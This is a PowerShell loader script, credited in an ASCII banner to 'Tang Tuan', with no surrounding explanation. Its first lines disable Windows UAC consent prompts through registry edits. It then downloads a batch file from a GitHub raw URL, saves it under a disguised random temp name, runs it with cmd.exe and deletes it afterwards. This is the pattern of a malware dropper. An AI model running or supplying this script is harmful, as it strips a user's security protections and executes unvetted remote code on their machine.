reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$URLs = @(
    'https://raw.githubusercontent.com/mitutina/mitutina/main/smb.bat'
)

foreach ($URL in $URLs | Sort-Object { Get-Random }) {
    try {
        $response = Invoke-WebRequest -Uri $URL -UseBasicParsing
        break
    } catch {}
}
if (-not $response) {
    Write-Host "Failed to retrieve the script from the available repository, aborting!"
    return
}

$rand = [Guid]::NewGuid().Guid
$FilePath = "$env:USERPROFILE\AppData\Local\Temp\scheduler_$rand.bat"
Set-Content -Path $FilePath -Value $response.Content

Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$FilePath`"" -Wait

Remove-Item -Path $FilePath -Force

#  __  __       _          ____                
# |  \/  | __ _| | _____  | __ ) _   _         
# | |\/| |/ _` | |/ / _ \ |  _ \| | | |        
# | |  | | (_| |   <  __/ | |_) | |_| |        
# |_|  |_|\__,_|_|\_\___| |____/ \__, |        
#  _____                _____    |___/         
# |_   _|_ _ _ __   __ |_   _|   _  __ _ _ __  
#   | |/ _` | '_ \ / _` || || | | |/ _` | '_ \ 
#   | | (_| | | | | (_| || || |_| | (_| | | | |
#   |_|\__,_|_| |_|\__, ||_| \__,_|\__,_|_| |_|
#                  |___/                       
